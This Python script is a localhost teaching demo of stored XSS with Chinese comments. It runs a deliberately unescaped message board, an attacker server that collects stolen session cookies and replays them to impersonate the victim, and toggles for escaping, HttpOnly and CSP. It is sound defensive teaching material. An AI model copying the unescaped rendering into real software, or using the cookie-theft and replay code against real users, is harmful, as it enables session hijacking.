#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSS(跨站脚本)攻击 —— 本机可运行的教学演示
=========================================================

同时启动两个站点(都只监听 127.0.0.1，不对外网开放):

    受害者站点  http://127.0.0.1:8000    一个内网"部门留言板"
    攻击者站点  http://127.0.0.1:8001    接收被窃取的 Cookie

用法:
    python xss_demo.py                             # 漏洞模式(默认)
    python xss_demo.py --escape                    # 修复一: 输出编码
    python xss_demo.py --httponly                  # 修复二: Cookie 加 HttpOnly
    python xss_demo.py --csp                       # 修复三: Content-Security-Policy
    python xss_demo.py --escape --httponly --csp   # 纵深防御(全部开启)

三个开关可以任意组合，现场逐个打开，观察攻击链在哪一环断掉。

仅用于教学与已授权测试环境。
"""

import argparse
import base64
import html
import json
import secrets
import sys
import threading
import time
import urllib.parse
import urllib.request
from http.cookies import SimpleCookie
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# Windows 控制台默认可能是 GBK，强制 UTF-8 以免中文乱码。
# line_buffering 让日志在重定向到文件时也能实时输出。
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)

VICTIM_PORT = 8000
ATTACKER_PORT = 8001

# 三个防护开关，由命令行参数控制
CFG = {"escape": False, "httponly": False, "csp": False}

# ---- 内存中的"数据库" ----------------------------------------------------
SESSIONS = {}   # sessid -> 用户信息
COMMENTS = []   # 留言板内容
STOLEN = []     # 攻击者收到的战利品

USERS = {
    "alice": {"user": "alice", "email": "alice@corp.example",
              "dept": "财务部", "role": "普通员工"},
    "bob":   {"user": "bob", "email": "bob@corp.example",
              "dept": "研发部", "role": "普通员工"},
}

# 1x1 透明 GIF，用作窃取请求的"图片"响应，让浏览器不报错
GIF_1PX = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
)

# ---- 终端着色 ------------------------------------------------------------

_COLORS = {"red": 31, "green": 32, "yellow": 33, "blue": 34,
           "magenta": 35, "cyan": 36, "bold": 1, "dim": 2}


def paint(text, *styles):
    if not sys.stdout.isatty():
        return text
    codes = ";".join(str(_COLORS[s]) for s in styles if s in _COLORS)
    return f"\033[{codes}m{text}\033[0m" if codes else text


def log(tag, msg, *styles):
    print(paint(f"[{tag}] ", "dim") + paint(msg, *styles), flush=True)


# ---- 页面样式与模板 ------------------------------------------------------

BASE_CSS = """
*{box-sizing:border-box}
body{margin:0;font-family:"Microsoft YaHei","Segoe UI",system-ui,sans-serif;
     background:#f1f5f9;color:#1f2937}
.topbar{background:#1e3a8a;color:#fff;padding:12px 26px;display:flex;
        justify-content:space-between;align-items:center}
.brand{font-weight:700;font-size:17px;letter-spacing:1px}
.nav a{color:#c7d2fe;text-decoration:none;margin-left:18px;font-size:14px}
.nav a:hover{color:#fff;text-decoration:underline}
.wrap{max-width:780px;margin:24px auto 60px;padding:0 16px}
.card{background:#fff;border-radius:10px;padding:20px 24px;margin-bottom:16px;
      box-shadow:0 1px 3px rgba(15,23,42,.09)}
h1{font-size:19px;margin:0 0 14px;display:flex;align-items:center;gap:10px}
textarea{width:100%;border:1px solid #cbd5e1;border-radius:8px;padding:10px;
         font-family:inherit;font-size:14px;resize:vertical;outline:none}
textarea:focus{border-color:#3b82f6;box-shadow:0 0 0 3px #dbeafe}
button{background:#1e3a8a;color:#fff;border:0;border-radius:8px;padding:9px 22px;
       font-size:14px;cursor:pointer;font-family:inherit}
button:hover{background:#1d4ed8}
.cmt{border-bottom:1px solid #f1f5f9;padding:13px 0}
.cmt:last-child{border-bottom:0}
.who{font-weight:600;color:#1e3a8a;font-size:14px}
.when{color:#94a3b8;font-size:12px;margin-left:8px}
.txt{margin-top:7px;line-height:1.75;font-size:15px;word-break:break-all}
.badge{font-size:12px;font-weight:600;padding:3px 11px;border-radius:99px;
       background:#fee2e2;color:#b91c1c}
.badge.ok{background:#dcfce7;color:#15803d}
.kv{display:flex;padding:9px 0;border-bottom:1px dashed #e2e8f0;font-size:15px}
.kv:last-child{border-bottom:0}
.kv .k{width:120px;color:#64748b;flex:none}
.kv .v{font-weight:600}
.muted{color:#94a3b8;font-size:13px}
.mono{font-family:Consolas,"Courier New",monospace;font-size:13px;
      background:#f8fafc;border:1px solid #e2e8f0;border-radius:6px;
      padding:12px 14px;word-break:break-all;line-height:1.7;white-space:pre-wrap}
.big{background:#dcfce7;border:1px solid #86efac;border-radius:8px;
     padding:14px 16px;color:#166534;font-weight:700;font-size:15px;margin-bottom:14px}
.bad{background:#fef2f2;border:1px solid #fecaca;border-radius:8px;
     padding:14px 16px;color:#991b1b;font-weight:700;font-size:15px;margin-bottom:14px}
"""


def page(title, body):
    return f"""<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="utf-8">
<title>{html.escape(title)}</title><style>{BASE_CSS}</style></head>
<body>
<div class="topbar">
  <span class="brand">内部办公系统</span>
  <span class="nav"><a href="/">留言板</a><a href="/me">我的资料</a>
  <a href="/reset">重置演示</a></span>
</div>
<div class="wrap">{body}</div>
</body></html>"""


def protection_badge():
    on = [name for key, name in (("escape", "输出编码"), ("httponly", "HttpOnly"),
                                 ("csp", "CSP")) if CFG[key]]
    if not on:
        return '<span class="badge">漏洞模式</span>'
    return f'<span class="badge ok">已启用: {" / ".join(on)}</span>'


# ---- 受害者站点 ----------------------------------------------------------

class VictimHandler(BaseHTTPRequestHandler):
    server_version = "IntranetPortal/1.0"

    def log_message(self, fmt, *args):
        if "favicon" in (fmt % args):
            return
        log("victim  ", fmt % args)

    # -- 工具方法 ----------------------------------------------------------

    def _current_user(self):
        """从 Cookie 中解析 session，还原出当前登录用户。"""
        raw = self.headers.get("Cookie", "")
        if not raw:
            return None
        jar = SimpleCookie()
        try:
            jar.load(raw)
        except Exception:
            return None
        morsel = jar.get("SESSID")
        if morsel and morsel.value in SESSIONS:
            return dict(SESSIONS[morsel.value])
        return None

    def _cookie_header(self, name, value):
        parts = [f"{name}={value}", "Path=/"]
        if CFG["httponly"]:
            # 关键修复: 加上 HttpOnly 后 JS 读不到这个 Cookie
            parts.append("HttpOnly")
        return "; ".join(parts)

    def _respond(self, body: bytes, status=200,
                 content_type="text/html; charset=utf-8",
                 cookie=None, extra_headers=()):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        if cookie:
            self.send_header("Set-Cookie", self._cookie_header(*cookie))
        if CFG["csp"]:
            self.send_header(
                "Content-Security-Policy",
                "default-src 'self'; object-src 'none'; base-uri 'none'",
            )
        for key, value in extra_headers:
            self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def _html(self, title, body, **kw):
        self._respond(page(title, body).encode("utf-8"), **kw)

    def _redirect(self, location, cookie=None):
        self._respond(b"", status=302, cookie=cookie,
                      extra_headers=[("Location", location)])

    # -- 路由 --------------------------------------------------------------

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        route = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        if route == "/":
            self.handle_board()
        elif route == "/me":
            self.handle_me(query)
        elif route == "/login":
            self.handle_login(query)
        elif route == "/reset":
            self.handle_reset()
        elif route == "/favicon.ico":
            self._respond(b"", status=204)
        else:
            self._respond(b"<h1>404 Not Found</h1>", status=404)

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path != "/comment":
            self._respond(b"<h1>404 Not Found</h1>", status=404)
            return
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length).decode("utf-8", "replace")
        fields = urllib.parse.parse_qs(raw)
        text = (fields.get("text") or [""])[0].strip()
        user = self._current_user() or {"user": "anonymous"}
        if text:
            COMMENTS.append({
                "author": user["user"],
                "text": text,
                "ts": time.strftime("%H:%M:%S"),
            })
            preview = text if len(text) <= 70 else text[:70] + "…"
            log("victim  ", f"收到新留言: {preview}", "cyan")
            # 注意: 这只是给讲解员看的旁白提示。
            # 真实系统绝不能靠"黑名单过滤 <script>"来防 XSS，见 PPT 第 11 页（常见误区）。
            if "<script" in text.lower() or "onerror" in text.lower():
                log("提示    ", "这条留言里含脚本代码，浏览器将把它当成网站自己的代码执行", "yellow")
        self._redirect("/")

    # -- 各页面 ------------------------------------------------------------

    def handle_board(self):
        user = self._current_user()
        cookie = None
        if not user:
            # 首次访问自动登录，模拟"你已经登录了公司内网"
            sid = secrets.token_hex(8)
            SESSIONS[sid] = dict(USERS["alice"])
            user = dict(SESSIONS[sid])
            cookie = ("SESSID", sid)

        rows = []
        for cm in COMMENTS:
            text = cm["text"]
            if CFG["escape"]:
                # 关键修复: 输出编码。把 < > & " ' 变成 HTML 实体，
                # 浏览器就只把它当"普通文字"显示，而不是当"代码"执行。
                text = html.escape(text)
            # 未开启编码时，text 被原样拼进 HTML —— 这就是漏洞本身
            rows.append(
                f'<div class="cmt">'
                f'<span class="who">{html.escape(cm["author"])}</span>'
                f'<span class="when">{cm["ts"]}</span>'
                f'<div class="txt">{text}</div></div>'
            )
        if not rows:
            rows.append('<div class="cmt"><div class="txt muted">还没有留言。</div></div>')

        body = f"""
<div class="card">
  <h1>部门留言板 {protection_badge()}</h1>
  <div class="muted" style="margin-bottom:12px">
    当前登录：<b>{html.escape(user["user"])}</b>（{html.escape(user["dept"])}）
  </div>
  <form method="POST" action="/comment">
    <textarea name="text" rows="3" placeholder="说点什么..."></textarea>
    <div style="margin-top:10px"><button type="submit">发表留言</button></div>
  </form>
</div>
<div class="card">
  <h1>全部留言</h1>
  {"".join(rows)}
</div>"""
        self._html("部门留言板", body, cookie=cookie)

    def handle_me(self, query):
        user = self._current_user()
        if not user:
            self._redirect("/login")
            return
        if (query.get("format") or [""])[0] == "json":
            payload = json.dumps(user, ensure_ascii=False).encode("utf-8")
            self._respond(payload, content_type="application/json; charset=utf-8")
            return
        body = f"""
<div class="card">
  <h1>我的资料</h1>
  <div class="kv"><span class="k">用户名</span><span class="v">{html.escape(user["user"])}</span></div>
  <div class="kv"><span class="k">邮箱</span><span class="v">{html.escape(user["email"])}</span></div>
  <div class="kv"><span class="k">部门</span><span class="v">{html.escape(user["dept"])}</span></div>
  <div class="kv"><span class="k">角色</span><span class="v">{html.escape(user["role"])}</span></div>
  <div class="kv"><span class="k">本页说明</span>
    <span class="v" style="font-weight:400">只有携带有效会话 Cookie 才能看到本页</span></div>
</div>"""
        self._html("我的资料", body)

    def handle_login(self, query):
        name = (query.get("as") or ["alice"])[0]
        if name not in USERS:
            name = "alice"
        sid = secrets.token_hex(8)
        SESSIONS[sid] = dict(USERS[name])
        log("victim  ", f"用户 {name} 登录成功，下发 SESSID={sid}", "green")
        self._redirect("/", cookie=("SESSID", sid))

    def handle_reset(self):
        COMMENTS.clear()
        SESSIONS.clear()
        STOLEN.clear()
        log("victim  ", "演示状态已重置", "green")
        self._redirect("/")


# ---- 攻击者站点 ----------------------------------------------------------

class AttackerHandler(BaseHTTPRequestHandler):
    server_version = "EvilServer/1.0"

    def log_message(self, fmt, *args):
        if "favicon" in (fmt % args):
            return
        log("attacker", fmt % args)

    def _respond(self, body: bytes, status=200,
                 content_type="text/html; charset=utf-8"):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        route = parsed.path

        if route == "/steal":
            self.handle_steal(query)
        elif route == "/impersonate":
            self.handle_impersonate(query)
        elif route == "/":
            self.handle_panel()
        elif route == "/favicon.ico":
            self._respond(b"", status=204)
        else:
            self._respond(b"<h1>404</h1>", status=404)

    def handle_steal(self, query):
        cookie = (query.get("c") or [""])[0]
        ua = self.headers.get("User-Agent", "-")
        STOLEN.append({"cookie": cookie, "ua": ua,
                       "ts": time.strftime("%H:%M:%S")})
        print()
        log("攻击者  ", "!! 收到被窃取的 Cookie !!", "red", "bold")
        log("攻击者  ", f"   凭证 = {cookie or '(空)'}", "red")
        log("攻击者  ", f"   来源 = {self.client_address[0]}   浏览器 = {ua[:60]}", "red")
        print()
        # 回一张 1x1 透明图片，让浏览器以为这是一张正常的图
        self._respond(GIF_1PX, content_type="image/gif")

    def handle_impersonate(self, query):
        cookie = (query.get("c") or [""])[0]
        req = urllib.request.Request(
            f"http://127.0.0.1:{VICTIM_PORT}/me?format=json")
        req.add_header("Cookie", cookie)
        try:
            with urllib.request.urlopen(req, timeout=3) as resp:
                data = json.loads(resp.read().decode("utf-8"))
            rows = "".join(
                f'<div class="kv"><span class="k">{html.escape(k)}</span>'
                f'<span class="v">{html.escape(str(v))}</span></div>'
                for k, v in data.items()
            )
            body = f"""
<div class="card">
  <h1>凭证复用结果</h1>
  <div class="big">登录成功 —— 系统已经完全把攻击者当成了 {html.escape(data.get("user", "?"))}</div>
  <div class="mono">攻击者从未知道密码，只是把偷来的 Cookie 原样带上：
Cookie: {html.escape(cookie)}</div>
  <div style="margin-top:16px">{rows}</div>
</div>
<div class="card"><a href="/">← 返回攻击者面板</a></div>"""
        except Exception as exc:
            body = f"""
<div class="card">
  <h1>凭证复用结果</h1>
  <div class="bad">登录失败: {html.escape(str(exc))}</div>
  <div class="muted">如果是因为会话已过期，请在受害者站点刷新页面重新登录后再试。</div>
</div>
<div class="card"><a href="/">← 返回攻击者面板</a></div>"""
        self._respond(page("攻击者面板", body).encode("utf-8"))

    def handle_panel(self):
        if STOLEN:
            items = []
            for item in reversed(STOLEN):
                quoted = urllib.parse.quote(item["cookie"])
                items.append(
                    f'<div class="cmt">'
                    f'<span class="who">战利品</span>'
                    f'<span class="when">{item["ts"]}</span>'
                    f'<div class="mono" style="margin-top:8px">{html.escape(item["cookie"])}</div>'
                    f'<div style="margin-top:10px">'
                    f'<a href="/impersonate?c={quoted}">'
                    f'<button>用这个凭证登录受害者系统</button></a></div></div>'
                )
            listing = "".join(items)
        else:
            listing = ('<div class="cmt"><div class="txt muted">'
                       '还没有偷到任何东西。去受害者站点发一条含脚本的留言试试。</div></div>')

        body = f"""
<div class="card">
  <h1>攻击者控制台</h1>
  <div class="muted">本服务器只负责接收受害者浏览器主动送来的数据。</div>
</div>
<div class="card">
  <h1>已窃取凭证 ({len(STOLEN)})</h1>
  {listing}
</div>"""
        self._respond(page("攻击者控制台", body).encode("utf-8"))


# ---- 启动 ----------------------------------------------------------------

class Server(ThreadingHTTPServer):
    daemon_threads = True
    # Windows 上 SO_REUSEADDR 允许两个进程绑同一端口，会导致旧服务继续抢连接、
    # 新参数静默不生效。演示必须"端口被占就报错"，所以这里显式关掉。
    allow_reuse_address = False


def check_port_free(port):
    import socket
    probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        probe.bind(("127.0.0.1", port))
    except OSError:
        return False
    finally:
        probe.close()
    return True


def banner():
    mode = []
    mode.append("输出编码 开" if CFG["escape"] else "输出编码 关")
    mode.append("HttpOnly 开" if CFG["httponly"] else "HttpOnly 关")
    mode.append("CSP 开" if CFG["csp"] else "CSP 关")
    print()
    print(paint("=" * 62, "blue"))
    print(paint("  XSS 跨站脚本攻击演示", "bold") +
          "   " + paint("模式: " + " | ".join(mode),
                        "green" if any(CFG.values()) else "red"))
    print(paint("=" * 62, "blue"))
    print(f"  受害者站点(留言板)  {paint('http://127.0.0.1:%d' % VICTIM_PORT, 'cyan')}")
    print(f"  攻击者站点(收数据)  {paint('http://127.0.0.1:%d' % ATTACKER_PORT, 'red')}")
    print()
    print(paint("  建议用两个浏览器窗口分别打开上面两个地址，", "dim"))
    print(paint("  然后在留言板里粘贴演示 payload。按 Ctrl+C 退出。", "dim"))
    print(paint("=" * 62, "blue"))
    print()


def main():
    parser = argparse.ArgumentParser(
        description="XSS 跨站脚本攻击本机演示（仅用于教学）")
    parser.add_argument("--escape", action="store_true",
                        help="开启输出编码（HTML 实体转义）")
    parser.add_argument("--httponly", action="store_true",
                        help="给会话 Cookie 加上 HttpOnly 属性")
    parser.add_argument("--csp", action="store_true",
                        help="下发 Content-Security-Policy 响应头")
    args = parser.parse_args()
    CFG["escape"] = args.escape
    CFG["httponly"] = args.httponly
    CFG["csp"] = args.csp

    for port in (VICTIM_PORT, ATTACKER_PORT):
        if not check_port_free(port):
            print(paint(f"\n端口 {port} 已被占用。", "red"))
            print("多半是上一次的演示进程还没退干净，执行下面这条命令清理后重试：")
            print(paint(f'  netstat -ano | findstr :{port}', "cyan"))
            print(paint("  taskkill /F /PID <上面查到的PID>", "cyan"))
            sys.exit(1)

    victim = Server(("127.0.0.1", VICTIM_PORT), VictimHandler)
    attacker = Server(("127.0.0.1", ATTACKER_PORT), AttackerHandler)
    threading.Thread(target=victim.serve_forever, daemon=True).start()
    threading.Thread(target=attacker.serve_forever, daemon=True).start()

    banner()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n正在关闭演示服务 ...")
        victim.shutdown()
        attacker.shutdown()


if __name__ == "__main__":
    try:
        main()
    except OSError as exc:
        print(paint(f"\n启动失败: {exc}", "red"))
        print("端口 8000/8001 可能已被占用，请先关掉占用进程再试。\n")
        sys.exit(1)
